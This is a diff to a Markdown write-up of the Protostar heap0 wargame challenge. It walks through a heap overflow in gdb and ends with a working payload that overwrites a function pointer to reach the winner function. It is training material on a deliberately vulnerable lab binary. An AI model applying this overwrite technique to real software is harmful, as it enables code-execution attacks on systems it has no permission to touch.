@@ -1,6 +1,9 @@
 ## Simple Heap Overflow
+> heap overflow, heap analysis, etc ...  
+:syringe: Learned and noted for everyone :syringe:
 
-heap0.c from protostar
+
+**:pill: heap0.c from protostar :pill:**
 
 ```clike
 #include <stdlib.h>
@@ -44,6 +47,8 @@ int main(int argc, char **argv)
 
 }
 ```
+:scroll: :scroll: :scroll: Definitions of code :scroll: :scroll: :scroll:
+
  - `d = malloc(sizeof(struct data));` -> allocated dynamic memory
  - `f = malloc(sizeof(struct fp));` -> allocated dynamic memory
  - `f->fp = nowinner;` -> function pointer is pointed to nowinner function
@@ -51,14 +56,14 @@ int main(int argc, char **argv)
  - `f->fp();` -> call the function that address stored in `f->fp`
  - in this challenge, we need to call winner function
 
-Testing challenge binary
+:hammer: :hammer: :hammer: Testing the program :hammer: :hammer: :hammer:
 
 ```
 $ ./heap0 AAAA BBBB
 data is at 0x804a008, fp is at 0x804a050
 level has not been passed
 ```
-**Viewing heap in gdb**
+:mag: :mag: :mag: Debugging Heap :mag_right: :mag_right: :mag_right:
 
  - `gdb -q ./heap0` -> load the program with gdb
  - `set disassembly-flavor intel` - > setting disassembly result to intel
@@ -132,6 +137,8 @@ Breakpoint 1, 0x080484d8 in main (argc=2, argv=0xbffffd64) at heap0/heap0.c:34
  - user input is not stored into heap chunk 
  - run after strcpy function called
 
+:grey_question: results :grey_question:
+
 ```
 0x804a000:      0x00000000      0x00000049      0x41414141      0x00000000
 0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
@@ -147,7 +154,7 @@ Breakpoint 1, 0x080484d8 in main (argc=2, argv=0xbffffd64) at heap0/heap0.c:34
 	 - we should inject payload more than 73 bytes 
 	 - `run $(python -c 'print "A"*80')`
 
-result
+:grey_question: results :grey_question:
 ```
 0x804a000:      0x00000000      0x00000049      0x41414141      0x41414141
 0x804a010:      0x41414141      0x41414141      0x41414141      0x41414141
@@ -166,7 +173,7 @@ controlling f->fp
  - `0x49 -> 73` -> but we need to consider f's chunk size
  - `73 - 1 = 72` -> `run $(python -c 'print "A"*72+"BBBB"')`
 
-result
+:grey_question: results :grey_question:
 ```
 0x804a000:      0x00000000      0x00000049      0x41414141      0x41414141
 0x804a010:      0x41414141      0x41414141      0x41414141      0x41414141
@@ -183,13 +190,23 @@ result
  - `0x08048464` -> `\x64\x84\x04\x08` in little endian
  - `run $(python -c 'print "A"*72+"\x64\x84\x04\x08"')` -> final payload
 
-result
+:grey_question: results :grey_question:
 
 ```
 $ ./heap0 $(python -c 'print "A"*72+"\x64\x84\x04\x08"')
 data is at 0x804a008, fp is at 0x804a050
 level passed
 ```
+
+Have fun! :v: :v: :v:
+
+---
+**:muscle: References :muscle:**  
+
+all resources listed here :point_right: [LOL-Fav](http://location-href.com/lol-fav/)  :page_facing_up:
+
+:snowman: Contributed and maintained by [Luna-](https://twitter.com/art0flunam00n)  
+:snowflake: Powered by [Legion of LOL](http://location-href.com)
 
 ---
 
